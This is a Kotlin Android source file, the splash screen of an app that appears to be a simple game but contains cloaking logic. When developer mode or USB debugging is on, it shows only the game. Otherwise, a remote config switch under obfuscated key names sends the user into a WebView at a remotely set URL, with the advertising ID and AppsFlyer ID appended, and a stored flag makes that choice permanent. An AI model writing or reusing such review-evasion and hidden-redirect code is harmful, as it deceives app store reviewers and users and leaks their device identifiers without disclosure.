package com.prog.zka.mac

import android.content.Context
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.prog.zka.mac.databinding.ActivityMainBinding
import com.prog.zka.mac.util.*
import com.prog.zka.mac.util.manager.DataStoreManager
import com.prog.zka.mac.util.network.internetConnection
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import org.json.JSONObject
import kotlin.system.exitProcess

class Splash : AppCompatActivity() {

    companion object {

        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {
                try {
                    checkDataStore()
                } catch (e: Exception) {
                    log("e: ${e.message}")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            R.id.gameFragment    -> {

//                            binding.root.also { rootCL ->
//                                ConstraintSet().apply {
//                                    clone(rootCL)
//                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
//                                    setHorizontalBias(binding.lottieLoader.id, .9f)
//                                }.applyTo(rootCL)
//                            }
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@Splash, R.color.black)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        setStartDestination(fragmentId)
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

//    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
//        super.onActivityResult(requestCode, resultCode, data)
//        webViewFragment?.onActivityResult(requestCode, resultCode, data)
//    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        webViewURL = it
                        startFragmentIdFlow.emit(R.id.webViewFragment)
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@Splash) && isUSB(this@Splash)) startFragmentIdFlow.emit(R.id.gameFragment)
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@Splash) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("conorgram")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getCryptoFromRemote(jsonObj.getBoolean("flies"), jsonObj.getBoolean("mill"), jsonObj.getString("trouble"))
                                        }
                                    }

                                } else {
                                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                                    log("fail = ${this.all}")
                                }
                            }
                        }
                   } catch (e: Exception) {
                       startFragmentIdFlow.emit(R.id.gameFragment)
                   }
                }
            }
        }
    }

    private suspend fun getCryptoFromRemote(flies: Boolean, mill: Boolean, trouble: String) {
        if (flies.not()) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val fl_trbl = trouble + "?" +
                            "adert_singid=${advertisingId}&" +
                            "asfer_fluid=${appsflyerUID}&" +
                            "cing_cmng=${AppsflyerUtil.campaignFlow.value}&" +
                            "dink=${FacebookUtil.deeplinkFlow.value}"

                    log("fl_trbl = $fl_trbl")

                    webViewURL = fl_trbl
                    startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                    lottie.hideLoader()

                    coroutine.launch(Dispatchers.IO) {
                        DataStoreManager.Key.update { "Good" }
                        if (mill.toString().last().code != 123) DataStoreManager.Link.update { fl_trbl }
                    }
                }

                AppsflyerUtil.initialize(this@Splash)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }

                FacebookUtil.initialize()
                coroutine.launch {
                    FacebookUtil.deeplinkFlow.collect {
                        log("deeplinkFlow = $it")
                        if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
            startFragmentIdFlow.emit(R.id.gameFragment)
        }
    }

    fun isDevMode(context: Context): Boolean {
        return Settings.Secure.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}